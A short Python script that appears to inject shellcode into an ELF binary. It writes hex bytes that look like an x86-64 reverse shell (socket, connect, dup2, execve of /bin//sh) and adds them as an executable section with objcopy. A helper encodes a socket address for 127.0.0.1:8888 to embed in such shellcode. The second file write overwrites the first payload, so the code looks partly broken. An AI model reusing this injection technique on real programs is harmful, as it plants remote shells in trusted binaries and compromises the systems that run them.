'''

'''
import ctypes, struct, binascii, os, socket

import subprocess

def CallObjcopy():  
    name="caca"
    fileRawData="a.scc"
    fileIn="EXECUTABLE/ELFx64_NOTEDITED_printf.out"
    fileOut="test.out"

    open(fileRawData, "wb").write(bytes.fromhex("6a2958996a025f6a015e0f0597b02a48b9feffdd478048f7d951545eb2100f056a035eb021ffce0f0575f899b03b5248b92f2f62696e51545f0f05"))
    open(fileRawData, "wb").write(bytes.fromhex("90909090909090909090EB1050"))

    subprocess.call(["objcopy","--add-section","."+name+"="+fileRawData,"--set-section-flags","."+name+"=read,load,code",fileIn,fileOut])

def sockaddr():
    IP = "127.0.0.1"
    PORT = 8888
    family = struct.pack('H', socket.AF_INET)
    portbytes = struct.pack('H', socket.htons(PORT))
    ipbytes = socket.inet_aton(IP)
    number = struct.unpack('Q', family + portbytes + ipbytes)
    number = -number[0]        #negate
    print("0x" + binascii.hexlify(struct.pack('>q', number)).decode('utf-8'))
